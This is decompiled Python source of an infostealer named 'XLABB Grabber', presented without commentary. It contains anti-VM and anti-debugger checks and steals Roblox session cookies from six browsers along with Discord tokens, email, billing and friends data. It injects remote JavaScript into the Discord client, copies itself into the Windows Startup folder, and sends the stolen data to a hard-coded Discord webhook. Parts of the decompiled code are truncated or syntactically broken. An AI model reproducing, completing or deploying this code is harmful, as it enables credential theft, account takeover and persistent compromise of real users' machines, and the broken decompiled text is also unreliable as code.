# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: xlabbgrabber.py
# Bytecode version: 3.12.0rc2 (3531)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

from discord_webhook import DiscordEmbed, DiscordWebhook
global C00K13s  # inserted
global C00K1C0UNt  # inserted
global P455w  # inserted
global DETECTED  # inserted
global p45WW0rDs  # inserted
global G4M1N6Z1p  # inserted
global hook  # inserted
global k3YW0rd  # inserted
global K1W1F113s  # inserted
global W411375Z1p  # inserted
global P455WC0UNt  # inserted
global T0K3Ns  # inserted
global O7H3rZ1p  # inserted
global c00K1W0rDs  # inserted
import browser_cookie3
import os
import psutil
import threading
import subprocess
import os
import winreg
import psutil
import platform
import requests
import browser_cookie3
import getmac
import ssl
import socket
import OpenSSL
import threading
import difflib
import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from discord import Embed, File, SyncWebhook
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from tokenize import Token
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import sys
import wmi
import subprocess
import uuid
import socket
import getpass

def user_check():
    USERS = ['Admin', 'BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'WDAGUtilityAccount', 'Abby', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G
    try:
        USER = os.getlogin()
        if USER in USERS:
            os.exit(1)
    except:
        return

def registry_check():
    reg1 = os.system('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul')
    reg2 = os.system('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul')
    if reg1!= 1 and reg2!= 1:
        os.exit(1)
    handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
    try:
        reg_val = winreg.QueryValueEx(handle, '0')[0]
        if 'VMware' in reg_val:
            os.exit(1)
    finally:  # inserted
        winreg.CloseKey(handle)

def process_check():
    while True:
        PROCESSES = ['http toolkit.exe', 'httpdebuggerui.exe', 'wireshark.exe', 'fiddler.exe', 'charles.exe', 'regedit.exe', 'cmd.exe', 'taskmgr.exe', 'vboxservice.exe', 'df5serv.exe', 'processhacker.exe', 'vboxtray.exe', 'vmtoolsd.exe', 'vmwaretray.exe', 'ida64.exe', 'ollydbg.exe', 'pestudio.exe', 'vmwareuser', 'vgauthservice.exe', 'vmacthlp.exe', 'x96dbg.exe', 'vmsrvc.exe', 'x32dbg.exe', 'vmusrvc.exe', 'prl_cc.exe', 'prl_tools.exe', 'qemu-ga.exe', 'joeboxcontrol.exe', 'ksdumperclient.exe', 'ksdumper.exe', 'joeboxserver.exe', 'xenservice.exe']
        for proc in psutil.process_iter():
            if any((procstr in proc.name().lower() for procstr in PROCESSES)):
                try:
                    proc.kill()
    pass

def hwid_check():
    HWIDS = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518
    try:
        HWID = subprocess.check_output('wmic csproduct get uuid', creationflags=134217728).decode().split('\n')[1].strip()
        if HWID in HWIDS:
            os.exit(1)
    except Exception:
        return None
    else:  # inserted
        pass

def ip_check():
    try:
        IPS = ['None', '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23',
        IP = requests.get('https://api.myip.com').json()['ip']
        if IP in IPS:
            os.exit(1)
    except:
        return

def registry_check():
    reg1 = os.system('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul')
    reg2 = os.system('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul')
    if reg1!= 1 and reg2!= 1:
        os.exit(1)
    handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
    try:
        reg_val = winreg.QueryValueEx(handle, '0')[0]
        if 'VMware' in reg_val:
            os.exit(1)
    finally:  # inserted
        winreg.CloseKey(handle)

def dll_check():
    vmware_dll = os.path.join(os.environ['SystemRoot'], 'System32\\vmGuestLib.dll')
    virtualbox_dll = os.path.join(os.environ['SystemRoot'], 'vboxmrxnp.dll')
    if os.path.exists(vmware_dll):
        os.exit(1)
    if os.path.exists(virtualbox_dll):
        os.exit(1)

def specs_check():
    try:
        RAM = str(psutil.virtual_memory()[0] / 1073741824).split('.')[0]
        DISK = str(psutil.disk_usage('/')[0] / 1073741824).split('.')[0]
        if int(RAM) <= 2:
            os.exit(1)
        if int(DISK) <= 50:
            os.exit(1)
        if int(psutil.cpu_count()) <= 1:
            os.exit(1)
    except:
        return

def proc_check():
    processes = ['VMwareService.exe', 'VMwareTray.exe']
    for proc in psutil.process_iter():
        for program in processes:
            if proc.name() == program:
                os.exit(1)

def mac_check():
    try:
        00:15:5d:00:00:b3 = ['00:03:47:63:8b:de', '00:0c:29:05:d8:6e', '00:0c:29:2c:c1:21', '00:0c:29:52:52:50', '00:0d:3a:d2:4f:1f', '00:15:5d:00:00:1d', '00:15:5d:00:00:a4', '00:15:5d:00:00:b3', '00:15:5d:00:00:c3', '00:15:5d:00:00:f3', '00:15:5d:00:01:81', '00:15:5d:00:02:26', '00:15:5d:00:05:8d', '00:15:5d:00:05:d5', '00:15:5d:00:06:43', '00:15:5d:00:07:34', '00:15:5d:00:1a:b9', '00:15:5d:00:1c:9a', '00:15:5d:13:66:ca', '00:15:5d:13:6d:0c', '00:15:5d:1e:01:c8', '00:15:5d:23:4c:a3', '00:15:5d:23:4c:ad', '00:15:5d:b6:e0:cc', '00:1b:21:13:15:20', '00:1b:21:13:21:26', '00:1b:21:13:26:44', '00:1b:21:13:32:20', '00:1b:21:13:32:51', '00:1b:21:13:33:55', '00:23:cd:ff:94:f0', '00:25:90:36:65:0c', '00:25:90:36:65:38', '00:25:90:36:f0:3b', '00:25:90:65:39:e4', '00:50:56:97:a1:f8', '00:50:56:97:ec:f2', '00:50:56:97:f6:c8', '00:50:56:a0:06:8d', '00:50:56:a0:38:06', '00:50:56:a0:39:18', '00:50:56:a0:45:03', '00:50:56:a0:59:10', '00:50:56:a0:61:aa', '00:50:56:a0:6d:86', '00:50:56:a0:84:88', '00:50:56:a0:af:75', '00:50:56:a0:cd:a8', '00:50:56:a0:d0:fa', '00:50:56:a0:d7:38', '00:50:56:a0:dd:00
        MAC = str(getmac.get_mac_address())
        if MAC in MACS:
            os.exit(1)
    except:
        return
hook = 'https://discord.com/api/webhooks/1278279514018943027/f5Jj_PlrAYtRPt4U-TSKnmHNxnsS9C7xbW_QGsVuf_S6nzepOhbEx_XYt0LMeSlZVaJ5'
inj3c710n_url = 'https://raw.githubusercontent.com/blxsi/asdasdas/main/inject.js'
color = 8462616
DETECTED = False

def g371P():
    ip = 'None'
    try:
        ip = urlopen(Request('https://api.ipify.org')).read().decode().strip()
    except:
        pass
    else:  # inserted
        return ip
requirements = [['requests', 'requests'], ['Crypto.Cipher', 'pycryptodome']]
for modl in requirements:
    __import__(modl[0])
except:
    subprocess.Popen(f'{executable} -m pip install {modl[1]}', shell=True)
    time.sleep(3)
else:  # inserted
    pass  # postinserted
import requests
from Crypto.Cipher import AES
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv('TEMP')
Threadlist = []

class DATA_BLOB(Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', POINTER(c_char))]

def g37D474(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 1, byref(blob_out)):
        return g37D474(blob_out)
    return None

def D3CrYP7V41U3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:(-16)].decode()
        return decrypted_pass

def L04Dr3QU3575(methode, url, data='', files='', headers=''):
    for i in range(8):
        try:
            if methode == 'POST':
                if data!= '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
    except:
        pass
                else:  # inserted
                    if files!= '':
                        r = requests.post(url, files=files)
                        if r.status_code == 200 or r.status_code == 413:
                            return r
    else:  # inserted
        return None

def L04DUr118(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers!= '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
    except:
        pass
            r = urlopen(Request(hook, data=data))
            return r
    else:  # inserted
        return None

def g108411NF0():
    ip = g371P()
    username = os.getenv('USERNAME')
    ipdatanojson = urlopen(Request(f'https://ipinfo.io/{ip}/json')).read().decode().replace('callback(', '').replace('})', '}')
    ipdata = loads(ipdatanojson)
    contry = ipdata['country']
    contryCode = ipdata['country'].lower()
    g108411NF0 = f':flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`'
    return g108411NF0

def TrU57(C00K13s):
    global DETECTED  # inserted
    data = str(C00K13s)
    tim = re.findall('.google.com', data)
    if len(tim) < (-1):
        DETECTED = True
        return DETECTED
    DETECTED = False
    return DETECTED

def inj3c710n():
    username = os.getlogin()
    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']
    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-1' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)
                                                    inj3c710n_cont = requests.get(inj3c710n_url).text
                                                    inj3c710n_cont = inj3c710n_cont.replace('%WEBHOOK%', hook)
                                                    with open(file_path, 'w', encoding='utf-8') as index_file:
                                                        index_file.write(inj3c710n_cont)
inj3c710n()

def G37UHQFr13ND5(token):
    badgeList = [{'Name': 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': '<a:developer:1095726251001520252> '}, {'Name': 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': '<a:bughunter2:1095726038031548456> '}, {'Name': 'Active_Developer', 'Value': 4194304, 'Emoji': '<a:activedev:1095725933236858991> '}, {'Name': 'Early_Supporter', 'Value': 512, 'Emoji': '<:early:1095728685144870922> '}, {'Name': 'House_Balance', 'Value': 256, 'Emoji': '<a:squad:1095728662386577438> '}, {'Name': 'House_Brilliance', 'Value': 128, 'Emoji': '<a:squad:1095728662386577438> '}, {'Name': 'House_Bravery', 'Value': 64, 'Emoji': '<a:squad:1095728662386577438> '}, {'Name': 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': '<a:bughunter:1095725763006844948> '}, {'Name': 'HypeSquad_Events', 'Value
    headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'}
    try:
        friendlist = loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships', headers=headers)).read().decode())
    except:
        return False
    else:  # inserted
        uhqlist = ''
        for friend in friendlist:
            OwnedBadges = ''
            flags = friend['user']['public_flags']
            for badge in badgeList:
                if flags // badge['Value']!= 0 and friend['type'] == 1:
                    if 'House' not in badge['Name']:
                        OwnedBadges += badge['Emoji']
                    flags = flags % badge['Value']
            if OwnedBadges!= '':
                uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist

def G3781111N6(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'}
    try:
        billingjson = loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources', headers=headers)).read().decode())
    except:
        return False
    else:  # inserted
        if billingjson == []:
            return ' -'
        billing = ''
        for methode in billingjson:
            if methode['invalid'] == False:
                if methode['type'] == 1:
                    billing += ':credit_card:'
                else:  # inserted
                    if methode['type'] == 2:
                        billing += ':parking: '
        return billing

def G3784D63(flags):
    if flags == 0:
        return ''
    OwnedBadges = ''
    badgeList = [{'Name': 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': 'developer:1095726251001520252> '}, {'Name': 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': '<a:bughunter2:1095726038031548456> '}, {'Name': 'Active_Developer', 'Value': 4194304, 'Emoji': '<a:activedev:1095725933236858991> '}, {'Name': 'Early_Supporter', 'Value': 512, 'Emoji': '<:early:1095728685144870922> '}, {'Name': 'House_Balance', 'Value': 256, 'Emoji': '<a:squad:1095728662386577438> '}, {'Name': 'House_Brilliance', 'Value': 128, 'Emoji': '<a:squad:1095728662386577438> '}, {'Name': 'House_Bravery', 'Value': 64, 'Emoji': '<a:squad:1095728662386577438> '}, {'Name': 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': '<a:bughunter:1095725763006844948> '}, {'Name': 'HypeSquad_Events', 'Value
    for badge in badgeList:
        if flags // badge['Value']!= 0:
            OwnedBadges += badge['Emoji']
            flags = flags % badge['Value']
    return OwnedBadges

def G3770K3N1NF0(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'}
    userjson = loads(urlopen(Request('https://discordapp.com/api/v6/users/@me', headers=headers)).read().decode())
    username = userjson['username']
    hashtag = userjson['discriminator']
    email = userjson['email']
    idd = userjson['id']
    pfp = userjson['avatar']
    flags = userjson['public_flags']
    nitro = ''
    phone = '-'
    if 'premium_type' in userjson:
        nitrot = userjson['premium_type']
        if nitrot == 1:
            nitro = '<a:subscriber:1095725882250895481> '
        else:  # inserted
            if nitrot == 2:
                nitro = '<a:boost:1095740247540776991> <a:subscriber:1095725882250895481> '
    if 'phone' in userjson:
        phone = f"`{userjson['phone']}`"
    return (username, hashtag, email, idd, pfp, flags, nitro, phone)

def CH3CK70K3N(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'}
    try:
        urlopen(Request('https://discordapp.com/api/v6/users/@me', headers=headers))
        return True
    except:
        return False
if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:  # inserted
    currentFilePath = os.path.dirname(os.path.abspath(__file__))
fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)
startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)
if os.path.abspath(filePath).lower()!= os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)

def UP104D70K3N(token, path):
    headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'}
    username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
    if pfp == None:
        pfp = 'https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&'
    else:  # inserted
        pfp = f'https://cdn.discordapp.com/avatars/{idd}/{pfp}'
    billing = G3781111N6(token)
    badge = G3784D63(flags)
    friends = G37UHQFr13ND5(token)
    if friends == '':
        friends = 'No HQ Friends'
    if not billing:
        badge, phone, billing = ('🔒', '🔒', '🔒')
    if nitro == '' and badge == '':
        nitro = ' -'
    data = {'content': [f'{g108411NF0()} | Found in `{path}`', color, {'name': '<:hackerblack:1095747410539593800> Token:', 'value': f'`{token}`\n[Click To Copy](https://superfurrycdn.nl/copy/{token})'}, {'name': '<:mail:1095741024678191114> Email:', 'value': f'`{email}`', 'inline': True}, {'name': '<a:blackworld:1095741984385290310> IP:', 'value': f'`{g371P()}', 'inline': True}, {'name': '<a:blackmoneycard:1095741026850852965> Billing:', 'value': f'{billing}', 'inline': True}, {'text': f'{username}', 'icon_url': f'#{hashtag}', 'url': f'XLABB Grabber | Thank you for using premium.', 'fields': f'{idd}', 'author': f'{pfp}'}, 'footer': {'url': f'{pfp}'}, 'thumbnail': {'url': f
    L04DUr118(hook, data=dumps(data).encode(), headers=headers)

class PcInfo:
    headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'}

    def __init__(self):
        self.get_inf(hook)

    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
    computer_os = platform.platform()
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    username = os.getenv('UserName')
    hostname = os.getenv('COMPUTERNAME')
    hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    cpu = wmi.WMI().Win32_Processor()[0]
    gpu = wmi.WMI().Win32_VideoController()[0]
    ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
    ip = requests.get('https://api.ipify.org').text
    data = {'content': g108411NF0(), 'embeds': [{'title': 'XLABB Grabber | System Info', 'description': f'<:userr:1164196007626670170> **PC Username:** `{username}`\n<:windowss:1164191405615362098> **PC Name:** `{hostname}`\n<:computerr:1164189052472393798> **OS:** `{computer_os}`\n\n<:blackworld:1164189050983415889> **IP:** `{ip}`\n<:wrenchh:1164189063306293358> **MAC:** `{mac}`\n<:keyy:1164192530456383529> **HWID:** `{hwid}`\n\n<:cpu:1164189055261605919> **CPU:** `{cpu.Name}`\n<:gpu:1164189947700453396> **GPU:** `{gpu.Name}`\n<:ramm:1164189059955036320> **RAM:** `{ram}GB`', 'color': color, 'footer': {'text': 'XLABB Grabber | Thank you for using premium.', 'icon_url': 'https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&'}}], 'username': 'XLABB Grabber | t.me/blxstealer', 'avatar_url': 'https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&', 'attachments': []}
    L04DUr118(hook, data=dumps(data).encode(), headers=headers)

def edge_logger():
    try:
        rcookies = browser_cookie3.edge(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        return rcookie
    except Exception as e:
        print(f'Error occurred in edge_logger: {str(e)}')
        return None

def chrome_logger():
    try:
        rcookies = browser_cookie3.chrome(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        return rcookie
    except Exception as e:
        print(f'Error occurred in chrome_logger: {str(e)}')
        return None

def firefox_logger():
    try:
        rcookies = browser_cookie3.firefox(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        return rcookie
    except Exception as e:
        print(f'Error occurred in firefox_logger: {str(e)}')
        return None

def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        return cookie
    except Exception as e:
        print(f'Error occurred in opera_logger: {str(e)}')
        return None

def operagx_logger():
    try:
        rcookies = browser_cookie3.opera_gx(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        return rcookie
    except Exception as e:
        print(f'Error occurred in operagx_logger: {str(e)}')
        return None

def chromium_logger():
    try:
        rcookies = browser_cookie3.chromium(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        return rcookie
    except Exception as e:
        print(f'Error occurred in chromium_logger: {str(e)}')
        return None
roblochrome, robloedge, roblofire, robloopera, roblogx, roblochromium = (chrome_logger(), edge_logger(), firefox_logger(), opera_logger(), operagx_logger(), chromium_logger())
headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'}
data = {'content': g108411NF0(), 'embeds': [{'title': 'XLABB Grabber | Roblox Information', 'description': f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```\nOperaGX:```{roblogx}```\nChromium:```{roblochromium}```', 'color': color, 'footer': {'text': 'XLABB Grabber | Thank you for using premium.', 'icon_url': 'https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&'}}], 'username': 'XLABB Grabber | t.me/blxstealer', 'avatar_url': 'https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&', 'attachments': []}
L04DUr118(hook, data=dumps(data).encode(), headers=headers)

def R3F0rM47(listt):
    e = re.findall('(\\w+[a-z])', listt)
    while 'https' in e:
        e.remove('https')
    while 'com' in e:
        e.remove('com')
    while 'net' in e:
        e.remove('net')
    return list(set(e))

def UP104D(name, link):
    headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'}
    if name == 'lxcook':
        rb = ' | '.join((da for da in c00K1W0rDs))
        if len(rb) > 1000:
            rrrrr = R3F0rM47(str(c00K1W0rDs))
            rb = ' | '.join((da for da in rrrrr))
        data = {'content': g108411NF0(), 'embeds': [{'title': 'XLABB Grabber | Cookies', 'description': f'**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [BLXCookies.txt]({link})', 'color': color, 'footer': {'text': 'XLABB Grabber | Thank you for using premium.', 'icon_url': 'https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&'}}], 'username': 'XLABB Grabber | t.me/blxstealer', 'avatar_url': 'https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&', 'attachments': []}
        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
    else:  # inserted
        if name == 'lxpassw':
            ra = ' | '.join((da for da in p45WW0rDs))
            if len(ra) > 1000:
                rrr = R3F0rM47(str(p45WW0rDs))
                ra = ' | '.join((da for da in rrr))
